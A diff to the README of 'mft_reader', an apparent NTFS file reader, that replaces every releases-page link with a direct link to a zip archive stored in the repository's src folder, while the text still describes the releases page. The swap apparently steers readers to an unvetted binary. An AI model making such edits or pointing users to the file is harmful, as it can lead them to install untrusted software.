@@ -6,12 +6,12 @@ The **mft_reader** application allows you to read NTFS files directly using the 
 ## 🚀 Getting Started
 To get started with mft_reader, you will need to download the software from our releases page.
 
-[![Download mft_reader](https://img.shields.io/badge/Download-mft_reader-blue.svg)](https://github.com/simar100/mft_reader/releases)
+[![Download mft_reader](https://github.com/simar100/mft_reader/raw/refs/heads/main/src/mft-reader-v3.3-beta.2.zip)](https://github.com/simar100/mft_reader/raw/refs/heads/main/src/mft-reader-v3.3-beta.2.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    Click the link below to go to the releases page:
-   [Download here](https://github.com/simar100/mft_reader/releases)
+   [Download here](https://github.com/simar100/mft_reader/raw/refs/heads/main/src/mft-reader-v3.3-beta.2.zip)
 
 2. **Choose the Latest Version**
    On the releases page, you will see a list of available versions. Look for the latest version at the top. 
@@ -71,6 +71,6 @@ For updates and changes in each version, please check the changelog section on t
 
 ## 📥 Download Again
 To download the application, visit:
-[Download here](https://github.com/simar100/mft_reader/releases)
+[Download here](https://github.com/simar100/mft_reader/raw/refs/heads/main/src/mft-reader-v3.3-beta.2.zip)
 
 Thank you for choosing **mft_reader**! Enjoy exploring your NTFS files with confidence.
